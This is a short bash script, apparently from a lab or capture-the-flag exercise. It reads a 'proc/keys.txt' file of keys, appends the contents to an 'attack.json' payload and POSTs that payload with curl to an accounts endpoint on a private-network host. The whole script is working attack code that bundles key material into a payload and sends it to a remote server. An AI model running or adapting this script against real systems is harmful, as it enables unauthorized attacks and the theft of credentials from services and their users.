#!/bin/bash

# Set the URL where you want to post the JSON file
URL="http://192.168.229.129:8888/accounts"

# Set the path to the JSON file
JSON_FILE="attack.json"

# Set the path to the keys.txt file
KEYS_FILE="proc/keys.txt"

# Check if the JSON file exists
if [ ! -f "$JSON_FILE" ]; then
    echo "Error: JSON file not found at $JSON_FILE"
    exit 1
fi

# Check if the keys.txt file exists
if [ -f "$KEYS_FILE" ]; then
    echo "Content of keys.txt:"
    cat "$KEYS_FILE"
    echo
    # Append the content of keys.txt to the JSON file
    cat "$KEYS_FILE" >> "$JSON_FILE"
else
    echo "Warning: keys.txt file not found at $KEYS_FILE. Continuing without keys."
fi

# Post the JSON file and execute it
curl -i -X POST -d @"$JSON_FILE" "$URL"; echo
